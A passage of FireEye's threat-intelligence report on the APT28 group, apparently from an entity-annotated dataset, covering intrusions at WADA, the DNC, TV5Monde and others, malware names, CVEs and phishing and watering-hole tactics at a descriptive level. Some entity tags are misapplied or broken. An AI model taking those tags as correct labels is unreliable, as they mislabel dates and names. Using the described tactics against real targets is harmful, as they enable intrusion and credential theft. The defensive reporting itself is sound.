announced that<THREAT_ACTOR>APT28</THREAT_ACTOR> was likely responsible for the spear phishing 
emails sent to members of several German political parties.  The head 
of Germany’s domestic intelligence agency, <ORG>Bundesamt für Verfassungsschutz</ORG> (<ORG>BfV</ORG>), also attributed the <TIMESTAMP>JUNE 2015</TIMESTAMP> compromise of 
the <ORG>Bundestag</ORG>’s networks to<THREAT_ACTOR>APT28</THREAT_ACTOR>.5,6 

<ORG>Kyrgyzstan Ministry  
of Foreign Affairs</ORG>

<TIMESTAMP>OCTOBER 2014 THROUGH SEPTEMBER 2015</TIMESTAMP>

<ORG>FireEye</ORG> iSight Intelligence identified changes made to domain name 
server (DNS) records that suggest that<THREAT_ACTOR>APT28</THREAT_ACTOR> intercepted email traf-
fic from the <ORG>Kyrgyzstan Ministry of Foreign Affairs</ORG> after maliciously 
modifying DNS records of the ministry’s authoritative DNS servers.

<ORG>Polish Government</ORG> & Power 
Exchange websites

<ORG>JUNE AND  
SEPTEMBER 2014</ORG>

<THREAT_ACTOR>APT28</THREAT_ACTOR> employed “Sedkit” in conjunction with strategic web compro-
mises to deliver “Sofacy” malware on Polish Government websites, 
and the websites of Polish energy company Power Exchange.7 



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 5

TABLE 2 :<THREAT_ACTOR>APT28</THREAT_ACTOR> NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS

Since 2014,<THREAT_ACTOR>APT28</THREAT_ACTOR> network activity has likely supported 
information operations designed to influence the domestic 
politics of foreign nations. Some of these operations have 
involved the disruption and defacement of websites, false flag 
operations using false hacktivist personas, and the theft of 
data that was later leaked publicly online.  

Table 2 highlights incidents in which victims suffered 
a compromise that<ORG>FireEye</ORG> iSIGHT Intelligence, other 
authorities, or the victims themselves later attributed to the 
group we track as<THREAT_ACTOR>APT28</THREAT_ACTOR>. All of these operations have aimed 
to achieve a similar objective: securing a political outcome 
beneficial to<COUNTRY>RUSSIA</COUNTRY>.

VICTIM TIMEFRAME<THREAT_ACTOR>APT28</THREAT_ACTOR> NETWORK ACTIVIT Y ASSOCIATED INFORMATION OPERATIONS 

ACTIVIT Y

World Anti-Doping  
Agency (<ORG>WADA</ORG>)

SEPTEMBER 2016
On September 13, <ORG>WADA</ORG> confirmed that<THREAT_ACTOR>APT28</THREAT_ACTOR> 
had compromised its networks and accessed 
athlete medical data.8  

On September 12, 2016, the “Fancy Bears’ Hack Team” persona 
claimed to have compromised <ORG>WADA</ORG> and released athletes’ 
medical records as “proof of American athletes taking dop-
ing.”9 

<COUNTRY>U.S.</COUNTRY> Democratic National 
Committee (<ORG>DNC</ORG>)

APRIL –  
SEPTEMBER 2016

The <ORG>DNC</ORG> announced it had suffered a network 
compromise and that a subsequent investigation 
found evidence of two breaches, attributed to 
<THREAT_ACTOR>APT28</THREAT_ACTOR> and APT29. <ORG>FireEye</ORG> analyzed the mal-
ware found on <ORG>DNC</ORG> networks and determined 
that it was consistent with our previous observa-
tions of<THREAT_ACTOR>APT28</THREAT_ACTOR> tools.10,11

In<TIMESTAMP>June 2016</TIMESTAMP>, shortly after the DNC’s announcement, the <IDENTITY>Guccifer 2.0</IDENTITY> persona claimed responsibility for the <ORG>DNC</ORG> breach 
and leaked documents taken from the organization’s network.  
<IDENTITY>Guccifer 2.0</IDENTITY> continued to leak batches of <ORG>DNC</ORG> documents 
through <TIMESTAMP>September.12,13</TIMESTAMP>

<IDENTITY>John Podesta</IDENTITY>
MARCH –  

NOVEMBER 2016

Investigators found that John Podesta, <IDENTITY>Hillary 
Clinton</IDENTITY>’s presidential campaign chairman, was 
one of thousands of individuals targeted in a 
mass phishing scheme using shortened URLs 
that security researchers attributed to<THREAT_ACTOR>APT28</THREAT_ACTOR>.14  

<TIMESTAMP>Throughout October and into early November</TIMESTAMP>, WikiLeaks pub-
lished 34 batches of email correspondence stolen from <IDENTITY>John 
Podesta</IDENTITY>’s personal email account. Correspondence of other 
individuals targeted in the same phishing campaign, including 
former Secretary of State <IDENTITY>Colin Powell</IDENTITY> and <IDENTITY>Clinton</IDENTITY> campaign 
staffer <IDENTITY>William Rinehart</IDENTITY>, were published on the  
“DC Leaks” website.15  

<COUNTRY>U.S.</COUNTRY> <ORG>Democratic  
Congressional Campaign 
Committee</ORG> (<ORG>DCCC</ORG>)

<TIMESTAMP>MARCH -  
OCTOBER 2016</TIMESTAMP>

<TIMESTAMP>In July</TIMESTAMP>, the <ORG>DCCC</ORG> announced that it was investi-
gating an ongoing “cybersecurity incident” that 
the <ORG>FBI</ORG> believed was linked to the compromise 
of the <ORG>DNC</ORG>.   House Speaker Nancy Pelosi 
later confirmed that the <ORG>DCCC</ORG> had suffered a 
network compromise.   Investigators indicated 
that the actors may have gained access to <ORG>DCCC</ORG> 
systems as early as <TIMESTAMP>March.16,17,18</TIMESTAMP>

In August, the <IDENTITY>Guccifer 2.0</IDENTITY> persona contacted reporters cov-
ering <COUNTRY>U.S.</COUNTRY> <ORG>House of Representative races</ORG> to announce newly 
leaked documents from the <ORG>DCCC</ORG> pertaining to Democratic  
candidates. From <TIMESTAMP>August to October</TIMESTAMP>, <IDENTITY>Guccifer 2.0</IDENTITY> posted sev-
eral additional installments of what appear to be internal <ORG>DCCC</ORG> 
documents on “his” <SOFTWARE>WordPress</SOFTWARE> site.19,20

TV5Monde
<TIMESTAMP>FEBRUARY 2015</TIMESTAMP>, 

<TIMESTAMP>APRIL 2015</TIMESTAMP>

<TIMESTAMP>In February</TIMESTAMP>,<ORG>FireEye</ORG> identified <SOFTWARE>CORESHELL</SOFTWARE> 
traffic beaconing from TV5Monde’s network, 
confirming that<THREAT_ACTOR>APT28</THREAT_ACTOR> had compromised TV-
5Monde’s network. 

In <TIMESTAMP>April 2015</TIMESTAMP>, alleged pro-ISIS hacktivist group <THREAT_ACTOR>CyberCaliphate</THREAT_ACTOR> 
defaced TV5Monde’s websites and social media profiles and 
forced the company’s 11 broadcast channels offline. <ORG>FireEye</ORG> 
identified overlaps between the domain registration details of 
CyberCaliphate’s website and<THREAT_ACTOR>APT28</THREAT_ACTOR> infrastructure.21

<ORG>Ukrainian Central  
Election Commission </ORG>
(<ORG>CEC</ORG>)

<TIMESTAMP>MAY 2014</TIMESTAMP>
Ukrainian officials revealed that the investigation 
into the compromise of the <ORG>CEC</ORG>’s internal net-
work identified malware traced to<THREAT_ACTOR>APT28</THREAT_ACTOR>.22 

<TIMESTAMP>During the May 2014</TIMESTAMP> Ukrainian presidential election, purported 
pro-Russian hacktivists <THREAT_ACTOR>CyberBerkut</THREAT_ACTOR> conducted a series of mali-
cious activities against the <ORG>CEC</ORG> including a system compromise, 
data destruction, a data leak, a distributed denial-of-service 
(DDoS) attack, and an attempted defacement of the <ORG>CEC</ORG> web-
site with fake election results.23  

8. “WADA Confirms Attack by Russian Cyber Espionage Group.” World Anti-Doping Agency. 13 Sept. 2016. Web. 29 Dec. 2016. 
9. Fancy Bears’ HT (fancybears). “@AnonPress Greetings. We hacked #<ORG>WADA</ORG>. We have Proof of American Athletes taking doping. Fancybear.net.” 12 Sept. 2016, 4:12 PM. Tweet. 
10. CrowdStrike refers to activity corresponding to FireEye’s<THREAT_ACTOR>APT28</THREAT_ACTOR> and APT29 as “Fancy Bear” and “Cozy Bear,” respectively.
11.  “Nakashima, Ellen. “Cyber Researchers Confirm<ORG>Russian Government</ORG> Hack of <ORG>Democratic National Committee</ORG>.” The Washington Post. 20<TIMESTAMP>June 2016</TIMESTAMP>. Web. 29 Dec. 2016. 
12.  “Rid, Thomas. “All Signs Point to<COUNTRY>RUSSIA</COUNTRY> Being Behind the <ORG>DNC</ORG> Hack.” Motherboard, Vice. 25 July 2016. Web. 29 Dec. 2016. 
13.   “Bennett, Cory. “Guccifer 2.0 Drops More <ORG>DNC</ORG> Docs.” Politico. 13 Sept. 2016. Web. 2 Jan. 2017. <>
14. Perlroth, Nicole. Shear, Michael D. “Private Security Group Says<COUNTRY>RUSSIA</COUNTRY> was Behind John Podesta’s Email Hack.” The New York Times. 21 Oct. 2016. Web. 2 Jan. 2017. 
15.  “Franceschi-Bicchierai, Lorenzo. “How Hackers Broke Into John Podesta and Colin Powell’s Gmail Accounts.” 20 Oct. 2016. Web. 2 Jan. 2017. 
16. “Nakashima, Ellen. “FBI Probes Suspected Breach of Another Democratic Organization by Russian Hackers.” The Washington Post. 29 July 2016. Web. 29 Dec. 2016. 
17.  “Pelosi, Nancy. “DCCC Cyber Breach.” 13 August 2016. Email. <COUNTRY>U.S.</COUNTRY> House of Representatives. Washington, DC. Politico. Web. 29 Dec. 2016. 
18.  “Lipton, Eric. Shane, Scott. “Democratic House Candidates Were Also Targets of Russian Hacking.” The New York Times. 13 Dec. 2016. Web. 29 Dec. 2016. 
19.  Ibid.



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 6

FROM OLYMPIC SLIGHT TO DATA LEAK: 
Investigating<THREAT_ACTOR>APT28</THREAT_ACTOR> at the World Anti-Doping Agency

As news of the <ORG>DNC</ORG> breach spread,<THREAT_ACTOR>APT28</THREAT_ACTOR> was preparing for another set 
of operations: countering the condemnation that<COUNTRY>RUSSIA</COUNTRY> was facing after 
doping allegations and a threatened blanket ban of the Russian team 
from the upcoming Rio Games.<COUNTRY>RUSSIA</COUNTRY>, like many nations, has long viewed 
success in the Olympic Games as a source of national prestige and soft 
power on the world stage. The doping allegations and prospective ban 
from the Games further ostracized<COUNTRY>RUSSIA</COUNTRY>, and likely provided motivation 
to actively counter the allegations by attempting to discredit anti-doping 
agencies and policies. Our investigation of APT28’s compromise of 
WADA’s network, and our observations of the surrounding events reveal 
how<COUNTRY>RUSSIA</COUNTRY> sought to counteract a damaging narrative and delegitimize 
the institutions leveling criticism. 

ALLEGATIONS OF RUSSIAN ATHLETES’ WIDESPREAD DOPING
NOV (2015)

<ORG>WADA</ORG> declares the 
<ORG>Russian Anti-Doping 
Agency</ORG> (<ORG>RUSADA</ORG>) non-
compliant.24

<TIMESTAMP>JULY 18</TIMESTAMP> 

<ORG>WADA</ORG>-commissioned 
report documents 
evidence of Russian 
athletes’ widespread 
doping.25

<TIMESTAMP>AUG 4</TIMESTAMP> 

Russian athletes were 
barred from competing 
in the Olympic Games.26

<THREAT_ACTOR>APT28</THREAT_ACTOR> COMPROMISES <ORG>WADA</ORG>

<TIMESTAMP>EARLY AUG</TIMESTAMP> 

<THREAT_ACTOR>APT28</THREAT_ACTOR> sends spear 
phishing emails to 
<ORG>WADA</ORG> employees.27

<TIMESTAMP>AUG 10</TIMESTAMP> 

<THREAT_ACTOR>APT28</THREAT_ACTOR> uses a legitimate 
user account belonging 
to a Russian athlete to 
log into WADA’s Anti-
Doping Administration 
and Management 
System (ADAMS) 
database.28

<TIMESTAMP>AUG 25-SEP 12</TIMESTAMP>

<THREAT_ACTOR>APT28</THREAT_ACTOR> gains access 
to an <ORG>International 
Olympic Committee</ORG> 
account created 
specifically for the 2016 
Olympic Games, and 
views and downloads 
athlete data.29



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 7

Based on this timeline of leak and threatened leak 
activity, as well as strikingly similar characteristics and 
distribution methods shared between @anpoland and 
“<THREAT_ACTOR>Fancy Bears</THREAT_ACTOR>’ Hack Team,” the same operators are highly 
likely behind the two personas. <ORG>WADA</ORG> officials, citing 
evidence provided by law enforcement, stated that the 
threat activity originated in<COUNTRY>RUSSIA</COUNTRY>, possibly in retaliation 

for WADA’s exposure of Russia’s expansive, state-run 
doping.38 The statement prompted denials from the 
<ORG>Russian Government</ORG>, with Russian sports minister  
<IDENTITY>Vitaly Mutko</IDENTITY> asking, “How can you prove that the 
hackers are Russian? You blame<COUNTRY>RUSSIA</COUNTRY> for everything,  
it is very in fashion now.”39

20. Gallagher, Sean. “<IDENTITY>Guccifer 2.0</IDENTITY> Posts <ORG>DCCC</ORG> Docs, Says They’re From Clinton Foundation.” Ars Technica. <TIMESTAMP>4 Oct. 2016</TIMESTAMP>. Web. <TIMESTAMP>3 Jan. 2017</TIMESTAMP>. 
21. “Russian Hackers Suspected in French TV Cyberattack.” <ORG>Deutsche Welle</ORG>. <TIMESTAMP>6 Oct. 2015</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
22. Joselow, Gabe. “Election Cyberattacks: Pro-Russia Hackers Have Been Accused in Past.” <ORG>NBC News</ORG>. <TIMESTAMP>3 Nov. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
23.  Clayton, Mark. “Ukraine Election Narrowly Avoided ‘Wanton Destruction’ From Hackers (+Video).” <ORG>The Christian Science Monitor</ORG>. <TIMESTAMP>17 June 2014</TIMESTAMP>. Web. <TIMESTAMP>2 Jan. 2017</TIMESTAMP>. 
24. “Foundation Board Media Release: <ORG>WADA</ORG> Strengthens Anti-Doping Worldwide.” <ORG>World Anti-Doping Agency</ORG>. <TIMESTAMP>18 November 2015</TIMESTAMP>.
25.  “Russia State-Sponsored Doping Across Majority of Olympic Sports, Claims Report.” <ORG>The BBC</ORG>. <TIMESTAMP>18 July 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
26.  Macguire, Eoghan. Almasy, Steve. “271 Russian Athletes Cleared for Rio Games.” <ORG>CNN</ORG>. <TIMESTAMP>5 August 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
27.  “Cyber Security Update: WADA’s Incident Response.” <ORG>World Anti-Doping Agency</ORG>. <TIMESTAMP>5 Oct. 2016</TIMESTAMP>. Web. <TIMESTAMP>3 Jan. 2017</TIMESTAMP>. 
28.  “<ORG>WADA</ORG> Confirms Attack by Russian Cyber Espionage Group.” <ORG>World Anti-Doping Agency</ORG>. <TIMESTAMP>13 Sept. 2016</TIMESTAMP>.
29. “<ORG>WADA</ORG> Confirms Another Batch of Athlete Data Leaked by Russian Cyber Hackers ‘<THREAT_ACTOR>Fancy Bear</THREAT_ACTOR>.’” <ORG>World Anti-Doping Agency</ORG>. <TIMESTAMP>14 Sept. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. <>
30. [OP PL]. “www.tas-cas.org.” Online video clip. YouTube. YouTube, <TIMESTAMP>9 Aug. 2016</TIMESTAMP>. Web. <TIMESTAMP>3 Jan. 2017</TIMESTAMP>. 
31.  Anonymous Poland (@anpoland). “@Cryptomeorg @ben_rumsby @PogoWasRight @Jason_A_Murdock @Cyber_War_News @kevincollier Tomorrow will ddos <ORG>WADA</ORG> and publish some secret dosc.” <TIMESTAMP>11 Aug 2016 10:10 AM</TIMESTAMP>. Tweet. 
32.  Anonymous Poland (@anpoland). “@JoeUchill within a few days will be new attack on the <ORG>WADA</ORG>/Olimpic.” <TIMESTAMP>5 Sept. 2016 5:19 AM</TIMESTAMP>. Tweet. 
33. Fancy Bears’ HT (fancybears). “@AnonPress Greetings. We hacked #<ORG>WADA</ORG>. We have Proof of American Athletes taking doping. Fancybear.net.” 
34.  Ibid.
35.  “<ORG>WADA</ORG> Confirms Attack by Russian Cyber Espionage Group.”<ORG>World Anti-Doping Agency</ORG>. <TIMESTAMP>13 Sept. 2016</TIMESTAMP>.
36.  Russian Hackers Leak <IDENTITY>Simone Biles</IDENTITY></TIMESTAMP> and <TIMESTAMP>Serena Williams</TIMESTAMP> Files.” <ORG>The BBC</ORG>. <TIMESTAMP>13 Sept. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
37.  Rumsby, Ben. “US Superstars <IDENTITY>Serena</IDENTITY> and <IDENTITY>Venus Williams</IDENTITY> and <IDENTITY>Simone Biles</IDENTITY></IDENTITY> Given Drugs Exemption, Russian Hackers Reveal.” <ORG>The Telegraph</ORG>. <TIMESTAMP>14 Sept. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
38.  Luhn, Alec.”Fancy Bears Origins Unclear But<COUNTRY>RUSSIA</COUNTRY> Seizes Chance to Put Boot into <ORG>WADA</ORG>.” <TIMESTAMP>15 Sept. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 
39.  Gibson, Owen. “Russian Sports Minister Vitaly Mutko Denies Link to <ORG>WADA</ORG> Hackers. <ORG>The Guardian</ORG>. <TIMESTAMP>14 Sept. 2016</TIMESTAMP>. Web. <TIMESTAMP>29 Dec. 2016</TIMESTAMP>. 

FALSE HACKTIVIST PERSONAS CLAIM TO TARGET <ORG>WADA</ORG>, LEAK ATHLETE DATA 

<TIMESTAMP>AUG 9</TIMESTAMP>

The actor  
@anpoland, 
purporting to  
represent 
“Anonymous <COUNTRY>Poland</COUNTRY>,” 
claims to have 
defaced the  
<ORG>WADA</ORG> website.30

<TIMESTAMP>AUG 11</TIMESTAMP> 

On <TIMESTAMP>August 11</TIMESTAMP>  
@anpoland threatens 
to conduct a DDoS 
attack against and 
leak data from <ORG>WADA</ORG>,  
but fails to follow 
through on the 
threats.31,32

<TIMESTAMP>SEP 12</TIMESTAMP>

“<THREAT_ACTOR>Fancy Bears</THREAT_ACTOR>’ Hack 
Team”, a previously 
unknown group 
purporting to 
be affiliated with 
Anonymous, claims 
via <ORG>Twitter</ORG></ORG> to have 
compromised <ORG>WADA</ORG>, 
and directs readers 
to a website hosting 
stolen documents.33 

In tweets to 
international 
journalists and  
<ORG>Twitter</ORG></ORGR> accounts  
that disseminate 
hacktivist and 
information security 
news, “<THREAT_ACTOR>Fancy Bears</THREAT_ACTOR>’ 
Hack Team” claims 
to have “proof of 
American athletes 
taking doping.”34

<TIMESTAMP>SEP 13</TIMESTAMP>

<ORG>WADA</ORG> releases a 
statement confirming 
the breach and 
attributes the 
compromise and  
theft of athlete 
medical data  
to<THREAT_ACTOR>APT28</THREAT_ACTOR>.35

<TIMESTAMP>SEP 15-30</TIMESTAMP>

“<THREAT_ACTOR>Fancy Bears</THREAT_ACTOR>’ Hack 
Team” releases five 
additional batches 
of medical files for 
high-profile athletes 
from multiple nations, 
including the <COUNTRY>U.S.</COUNTRY>, 
which had applied 
for and received 
Therapeutic Use 
Exemptions (TUEs) 
for medications 
otherwise banned 
from competition.36 

Claiming to support 
“fair play and clean 
sport,” <THREAT_ACTOR>Fancy Bears</THREAT_ACTOR>’ 
Hack team calls TUEs 
“licenses for doping.”37



Since releasing our 2014 report, we continue to assess that 
<THREAT_ACTOR>APT28</THREAT_ACTOR> is sponsored by the<ORG>Russian Government</ORG>. We further 
assess that<THREAT_ACTOR>APT28</THREAT_ACTOR> is the group responsible for the network 
compromises of <ORG>WADA</ORG> and the <ORG>DNC</ORG> and other entities 
related to the 2016 <COUNTRY>U.S.</COUNTRY> presidential election cycle. These 
breaches involved the theft of internal data - mostly emails 
– that was later strategically leaked through multiple forums 
and propagated in a calculated manner almost certainly 
intended to advance particular<ORG>Russian Government</ORG> aims. In 
a report released on <TIMESTAMP>January 7 2017</TIMESTAMP>, the <COUNTRY>U.S.</COUNTRY> <ORG>Directorate of 
National Intelligence</ORG> described this activity as an “influence 
campaign.” 

This influence campaign - a combination of network 
compromises and subsequent data leaks - aligns closely 
with the Russian military’s publicly stated intentions and 
capabilities. Influence operations, also frequently called 
“information operations,” have a long history of inclusion 
in Russian strategic doctrine, and have been intentionally 
developed, deployed, and modernized with the advent of 
the internet. The recent activity in the <COUNTRY>U.S.</COUNTRY> is but one of 
many instances of<ORG>Russian Government</ORG> influence operations 
conducted in support of strategic political objectives, and it 
will not be the last. As the 2017 elections in <COUNTRY>Europe</COUNTRY> approach 
- most notably in <COUNTRY>Germany</COUNTRY>, <COUNTRY>France</COUNTRY>, and the <COUNTRY>Netherlands</COUNTRY> - we 
are already seeing the makings of similarly concerted efforts.

CONCLUSION

 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 8



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 9

In our 2014 report, we identified<THREAT_ACTOR>APT28</THREAT_ACTOR> as a suspected Russian 
government-sponsored espionage actor. We came to this conclusion 
in part based on forensic details left in the malware that<THREAT_ACTOR>APT28</THREAT_ACTOR> had 
employed since at least 2007. We have provided an updated version of 
those conclusions, a layout of the tactics that they generally employ, 
as well as observations of apparent tactical shifts. For full details, 
please reference our 2014 report,<THREAT_ACTOR>APT28</THREAT_ACTOR>: A Window into Russia’s Cyber 
Espionage Operations? 

<THREAT_ACTOR>APT28</THREAT_ACTOR> employs a suite of malware with features indicative of the group’s 
plans for continued operations, as well as the group’s access to resources 
and skilled developers.  

Key characteristics of APT28’s toolset include:

• A flexible, modular framework that has allowed<THREAT_ACTOR>APT28</THREAT_ACTOR>  
to consistently evolve its toolset since at least 2007. 

• Use of a formal coding environment in which to develop 
tools, allowing the group to create and deploy custom  
modules within its backdoors.

• Incorporation of counter-analysis capabilities including 
runtime checks to identify an analysis environment, obfuscated 
strings unpacked at runtime, and the inclusion of unused 
machine instructions to slow analysis.

• Code compiled during the normal working day in the Moscow 
time zone and within a Russian language build environment. 

OVER

97%
OF  

APT28’S MALWARE 
SAMPLES WERE 

COMPILED DURING  
THE WORKING WEEK

88%
OF  

SAMPLES COMPILED 
BETWEEN 8AM AND 6PM 
IN THE TIMEZONE THAT 

INCLUDES MAJOR RUSSIAN 
CITIES SUCH AS MOSCOW 

AND ST. PETERSBURG

IN ADDITION,  
APT28’S DEVELOPERS 
CONSISTENTLY BUILT 
MALWARE IN RUSSIAN 

LANGUAGE SETTINGS UNTIL

2013

APPENDIX: 
APT28’s Tools, Tactics, and Operational Changes



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 10

APT28’S MALWARE SUITE

TOOL ROLE AK A

<MALWARE>CHOPSTICK</MALWARE> backdoor <MALWARE>Xagent</MALWARE>, <MALWARE>webhp</MALWARE>, <MALWARE>SPLM</MALWARE>, (.v2 <MALWARE>fysbis</MALWARE>)

<MALWARE>EVILTOSS</MALWARE> backdoor <MALWARE>Sedreco</MALWARE>, <MALWARE>AZZY</MALWARE>, <MALWARE>Xagent</MALWARE>, <MALWARE>ADVSTORESHELL</MALWARE>, <MALWARE>NETUI</MALWARE>

<MALWARE>GAMEFISH</MALWARE> backdoor <MALWARE>Sednit</MALWARE>, <MALWARE>Seduploader</MALWARE>, <MALWARE>JHUHUGIT</MALWARE>, <THREAT_ACTOR>Sofacy</THREAT_ACTOR>

<MALWARE>SOURFACE</MALWARE> downloader Older version of <MALWARE>CORESHELL</MALWARE>, <THREAT_ACTOR>Sofacy</THREAT_ACTOR>

<MALWARE>OLDBAIT</MALWARE>
credential  
harvester

<MALWARE>Sasfis</MALWARE>

<MALWARE>CORESHELL</MALWARE> downloader Newer version of <MALWARE>SOURFACE</MALWARE>, <THREAT_ACTOR>Sofacy</THREAT_ACTOR> 

APT28’S OPERATIONAL CHANGES SINCE 2014

<THREAT_ACTOR>APT28</THREAT_ACTOR> continues to evolve its toolkit and refine its tactics  
in what is almost certainly an effort to protect its operational 
effectiveness in the face of heightened public exposure and 
scrutiny. In addition to the continued evolution of the group’s 
first stage tools, we have also noted<THREAT_ACTOR>APT28</THREAT_ACTOR>:

• Leveraging zero-day vulnerabilities in <SOFTWARE>Adobe Flash Player</SOFTWARE>, 
<SOFTWARE>Java</SOFTWARE>, and <SOFTWARE>Windows</SOFTWARE>, including <CVE>CVE-2015-1701</CVE>, <CVE>CVE-2015-2424</CVE>, 
<CVE>CVE-2015-2590</CVE>, <CVE>CVE-2015-3043</CVE>, <CVE>CVE-2015-5119</CVE>, and <CVE>CVE-
2015-7645</CVE>. 

• Using a profiling script to deploy zero-days and other  
tools more selectively, decreasing the chance that researchers  
and others will gain access to the group’s tools.

• Increasing reliance on public code depositories, such  
as <MALWARE>Carberp</MALWARE>, <SOFTWARE>PowerShell Empire</SOFTWARE>, <SOFTWARE>P.A.S. webshell</SOFTWARE>, <SOFTWARE>Metasploit</SOFTWARE> 
modules, and others in a likely effort to accelerate their 
development cycle and provide plausible deniability.

• Obtaining credentials through fabricated Google  
App authorization and Oauth access requests that allow  
the group to bypass two-factor authentication and other 
security measures.

• Moving laterally through a network relying only  
on legitimate tools that already exist within the victims’ 
systems, at times forgoing their traditional toolset for the 
duration of the compromise.

These changes are not only indicative of APT28’s skills, 
resourcefulness, and desire to maintain operational 
effectiveness, but also highlight the longevity of the  
group’s mission and its intent to continue its activities  
for the foreseeable future.



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 11

<THREAT_ACTOR>APT28</THREAT_ACTOR> TACTICS

We have observed<THREAT_ACTOR>APT28</THREAT_ACTOR> rely on four key tactics when attempting  
to compromise intended targets. These include sending spear-phishing 
emails that either deliver exploit documents that deploy malware onto 
a user’s systems, or contain a malicious URL designed to harvest the 
recipients’ email credentials and provide access to the their accounts. 
<THREAT_ACTOR>APT28</THREAT_ACTOR> has also compromised and placed malware on legitimate websites 
intending to infect site visitors, and has gained access to organizations by 
compromising their web-facing servers

.
<THREAT_ACTOR>APT28</THREAT_ACTOR> IS IN YOUR NETWORK.

Victim goes to link and  
retrieves malicious  

document or is served a 
web-based exploit that  

installs malware.

(<SOFTWARE>Flash</SOFTWARE> Vulnerability <CVE>CVE-
2016-7855</CVE> and <SOFTWARE>Windows</SOFTWARE> 

Vulnerability <CVE>CVE-2016-7255</CVE> 
were exploited as zero days to 
install malware on victims who 

visited a malicious URL).

Victim opens document, 
and malware is installed by 
exploiting a vulnerability 

(e.g., ARM-NATO_
ENGLISH_30_NOV_2016.

doc leveraged an <SOFTWARE>Adobe Flash</SOFTWARE> 
exploit, <CVE>CVE-2016-7855</CVE>,  

to install <MALWARE>GAMEFISH</MALWARE>  
targeted machine).

TACTIC

Craft exploit document  
with enticing lure content.

Send exploit document  
to victim.

Send link mirroring structure  
of legitimate organization’s 

site that is designed to 
expire once users clickit.

Register a domain spoofing 
that of a legitimate 
organization (e.g., 

theguardiannews[.]org).

INFECTION WITH MALWARE VIA SPEAR PHISH

Person is asked to authorize 
application to view mail  

and gives access.

<THREAT_ACTOR>APT28</THREAT_ACTOR> leverages OAuth 
privileges given to malicious 

application to read email.

Recipient visits fake login page 
and enters credentials.

<THREAT_ACTOR>APT28</THREAT_ACTOR> uses stolen  
credentials to access  

mailbox and read email. 

Register a domain spoofing a webmail service  
or an organization’s webmail portal  

(e.g., 0nedrive-0ffice365[.]com)

Send email to targets  
instructing them  

to reset their passwords.

Send email to victims  
warning of security risk  

and asking them to enable 
security service.

TACTIC

WEBMAIL ACCESS VIA SPEAR-PHISH



 SPECIAL REPORT /<THREAT_ACTOR>APT28</THREAT_ACTOR>: AT THE CENTER OF THE STORM 12

<THREAT_ACTOR>APT28</THREAT_ACTOR> IS IN YOUR NETWORK.

Users of the site are redirected using malicious  
iFrame and profiled 

(e.g, this technique was used  
to compromise and infect visitors to numerous  

Polish Government websites in 2014).

Exploit is served to users matching the target profile  
and malware is installed on their system.

Compromise a legitimate site and set up 
malicious iFrame.

TACTIC

INFECTION WITH MALWARE VIA STRATEGIC  
WEB COMPROMISE (SWC)

<THREAT_ACTOR>APT28</THREAT_ACTOR> IS IN YOUR NETWORK.

Exploitation of previously known vulnerabilities  
present on unpatched systems.

Leverage initial compromise to access other systems  
and move deeper into the victim network.

Network reconnaissance to find vulnerable software.

TACTIC

ACCESS THROUGH INTERNET-FACING SERVERS



<ORG>FireEye</ORG>, Inc.  
1440 McCarthy Blvd. Milpitas, CA 95035  
408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com  

www.FireEye.com

To download this or other  
<ORG>FireEye</ORG> iSIGHT Intelligence reports, 
visit: www.fireeye.com/reports.html

© 2016<ORG>FireEye</ORG>, Inc. All rights reserved.<ORG>FireEye</ORG> is a registered trademark of<ORG>FireEye</ORG>, Inc.  
All other brands, products, or service names are or may be trademarks  
or service marks of their respective owners. GRAF-60.",APT28;Fancy Bears;Sofacy;CyberCaliphate;CyberBerkut;Fancy Bear,Adobe Flash;Windows;WordPress;CORESHELL;Adobe Flash Player;Java;PowerShell Empire;P.A.S. webshell;Metasploit;Flash,,"WADA;FireEye;DNC;Russian Government;DCCC;World Anti-Doping Agency;NATO;CEC;FBI;The BBC;Twitter;Democratic National Committee’s;Department of Homeland Security;DHS;Federal Bureau of Investigation;Russian 
Government;North Atlantic Treaty Organization;Afghan Ministry 
of Foreign Affairs;Pakistani military;German Bundestag;Bundesamt für Verfassungsschutz;BfV;Bundestag;Kyrgyzstan Ministry  
of Foreign Affairs;Kyrgyzstan Ministry of Foreign Affairs;Polish Government;JUNE AND  
SEPTEMBER 2014;Democratic  
Congressional Campaign 
Committee;House of Representative races;Ukrainian Central  
Election Commission ;Democratic National Committee;Russian Anti-Doping 
Agency;RUSADA;International 
Olympic Committee;Deutsche Welle;NBC News;The Christian Science Monitor;CNN;The Telegraph;The Guardian;Directorate of 
National Intelligence","29 Dec. 2016;3 Jan. 2017;13 Sept. 2016;14 Sept. 2016;JUNE 2015;June 2016;December 29, 2016;October 2014;OCTOBER 2014 THROUGH SEPTEMBER 2015;September.12,13;Throughout October and into early November;MARCH -  
